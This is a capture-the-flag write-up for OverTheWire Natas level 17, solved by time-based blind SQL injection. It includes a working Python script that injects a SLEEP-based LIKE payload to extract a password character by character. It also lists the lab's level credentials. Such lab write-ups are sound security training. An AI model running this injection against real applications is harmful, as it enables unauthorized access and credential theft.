This level focuses on fully blind SQL injection using time-based SQL injection technique.
![[Pasted image 20260715073613.png]]

The app doesn't provide any feedback regards the input:
![[Pasted image 20260715073644.png]]

The one way to detect if something is right is by time based. Normally, If we input `natas18` it returns immediately and we know that the user exists. So, add `AND SLEEP(5)` to the input making the statement still true and hangs 5s before sending us the response.

Writing the script:
```python
import httpx
import string
import base64

url = "http://natas17.natas.labs.overthewire.org/index.php"

b64_bytes = base64.b64encode("natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx".encode('utf-8'))
b64_string = b64_bytes.decode('utf-8')

headers = {
    "Authorization":f"Basic {b64_string}",
    "Content-Type":"application/x-www-form-urlencoded"
    }

chars = string.ascii_letters + string.digits
password = ""

while len(password) < 32:
    try:
        for char in chars:
            payload = {"username":f"natas18\" AND BINARY password LIKE \"{password+char}%\" AND SLEEP(5)#"}
            response = httpx.post(url=url, headers=headers, data=payload,timeout=10.0)

            print(f"Attempted: {password+char}")

            if response.elapsed.seconds > 4:
                password += char
                print(f"Current password: {password}")
                break
    except KeyboardInterrupt:
        print("Interrupted")
        break

print(f"Found password:{password}")
```

lvl18 pass: fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op